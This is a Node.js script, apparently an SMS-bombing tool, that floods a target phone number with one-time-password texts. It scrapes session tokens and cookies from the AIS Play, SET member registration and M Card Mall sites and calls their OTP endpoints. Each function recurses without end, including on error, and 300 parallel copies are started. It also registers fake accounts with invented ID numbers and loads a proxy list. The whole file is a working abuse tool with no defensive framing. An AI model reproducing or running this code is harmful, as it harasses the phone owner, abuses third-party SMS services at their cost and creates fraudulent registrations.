const axios = require("axios")
const HttpsProxyAgent = require('https-proxy-agent');
const fs = require('fs')
const proxies = fs.readFileSync('proxy.txt', 'utf-8').replace(/\r/gi, '').split('\n').filter(Boolean);
const formUrlEncoded = x =>
Object.keys(x).reduce((p, c) => p + `&${c}=${encodeURIComponent(x[c])}`, '')
//==============================================================================
async function ais_spam(phone){
    try{
        var token = await axios.get('https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?httpGenerate=generated')
        var send = await axios({
            method: 'post',
            url: 'https://srfng.ais.co.th/api/v2/login/sendOneTimePW',
            data: {
                'msisdn': phone,
                'serviceId':'AISPlay',
                'accountType':'all',
                'otpChannel':'sms'
            },
            headers: {
                'Authorization': 'Bearer ' + token.data.match(/<!--<input type="hidden" id='token' value="[^}]*">-->\n/g)[0].replace(/\s+/g, '').replace(/'/g, '"').replace('">-->', '').replace('<!--<inputtype="hidden"id="token"value="',''),
                'Cookie': token.headers['set-cookie'],
                'X-Requested-With':' XMLHttpRequest',
            }
        })
        console.log("Api ais send")
        ais_spam(phone)
    }catch(e){
        console.log("ERROR")
        ais_spam(phone)
    }
}
async function setmember_spam(phone){
    try{
        var register = await axios({
            method:"POST",
            url:"https://api.set.or.th/api/member/registration",
            data:{
                itizenId: "4751762444328",
                country: "th",
                email: "sogood@meowmeow.com",
                firstName: "แมว",
                gender: "M",
                lastName: "รักน่าที่สุด",
                mobile: phone,
                passport: "",
                password: "BossNz#9999",
                subscriptionFlag: true,
                termFlag: true,
            }
        })
        var sendsms = await axios({
            method:"POST",
            url:"https://api.set.or.th/api/otp/request",
            data:{
                channel: "MOBILE",
                refID: register.data.userRef,
                type: "REGISTRATION"
            }
        })
        console.log("Api member send")
        setmember_spam(phone)
    }catch(e){
        console.log("ERROR")
        setmember_spam(phone)
    }
}
async function Mcard_spam(phone){
    try{
        var get_csrf = await axios.get('https://www.mcardmall.com/th/home')
        var get_token = await axios({
            method:"GET",
            url:"https://www.mcardmall.com/th/apply/check",
            headers:{
                cookie:get_csrf.headers['set-cookie'][0]+";"+get_csrf.headers['set-cookie'][1]+";"
            }
        })
        await axios({
            method:"POST",
            url:"https://www.mcardmall.com/th/apply/check",
            data:formUrlEncoded({
                '_token': get_token.data.split('<input type="hidden" name="_token" value="').pop().split('">')[0],
                'mode': 'check',
                'identity': 3874953321682,
                'contact': phone,
                'P0': 'on',
                'P1': 'on',
                'P2': 'on',
            }),
            headers:{
                cookie:get_csrf.headers['set-cookie'][0]+";"+get_csrf.headers['set-cookie'][1]+";"
            }
        })
        console.log("Api Mcard send")
        Mcard_spam(phone)
    }catch(e){
        console.log("ERROR")
        Mcard_spam(phone)
    }
}
var phone = ""
for (var i = 0; i < 300; i++) {
    Mcard_spam(phone)
    setmember_spam(phone)
    ais_spam(phone)
}